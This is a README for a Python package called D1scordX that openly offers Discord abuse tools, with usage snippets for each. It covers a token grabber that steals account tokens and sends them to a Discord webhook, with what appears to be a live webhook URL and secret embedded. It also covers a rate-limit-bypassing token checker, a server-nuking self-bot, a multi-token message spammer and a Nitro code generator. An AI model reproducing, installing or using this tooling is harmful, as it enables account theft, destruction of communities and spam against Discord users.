<p align="center">
  <b>Link:</b><br>
  <a href="https://discord.gg/yBA7Wk67rH">Discord</a> |
  <a href="https://www.youtube.com/c/XinGod">YouTube</a> |
  <a href="https://github.com/XinOnGithub">Github</a>
  <br>
  <img src="https://cdn.discordapp.com/icons/791223032215240725/a_34b811424e1310fa438832dad9d113cf.gif">
</p>
<h1 align="center">Setup</h1>

## Tips:
- **Install module with**: ``pip install D1scordX``

## Features:

- CheckTokens   |   Check a token list from txt file and bypass ratelimit(discord api(not bypassing Cloudflare))
- TokenGrabber  |   Grab discord token using webhook
- SelfNukeBot   |   Nuke discord server with your own account
- TokenSpammer  |   Spam message with your **valid token**
- GenerateNitro |   Generate nitro and save on a txt file

## How to use:

- **CheckTokens**
```py
from D1scordX import CheckTokens

useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
CheckTokens('filename.txt',useragent)

#in filename.txt we have token(list)
```

- **TokenGrabber**
```py
from D1scordX import TokenGrabber

webhook = 'https://discord.com/api/webhooks/826913797411045396/M1J0F8t7ngBLqWY1CEK3dDvCY4eN-YYLwhNkNKJj1MZKOKvwDViHgkqKGSa5TRjownWo'
TokenGrabber(webhook)
```

- **SelfNukeBot**
```py
from D1scordX import SelfNukeBot

token = 'token'
prefix = 'bot prefix ex:$'
SelfNukeBot(token,prefix)
```

- **TokenSpammer**
```py
from D1scordX import TokenSpammer

TokenSpammer('my token file.txt',channel id (791225898242015255),message to send,10)
ex:TokenSpammer('tokens.txt',791225898242015255,hello world,10)

#in my token file.txt we have token(list)
```

- **GenerateNitro**
```py
from D1scordX import GenerateNitro

GenerateNitro('outpout file.txt',count of nitro)
ex:GenerateNitro('mynitro.txt',100)
```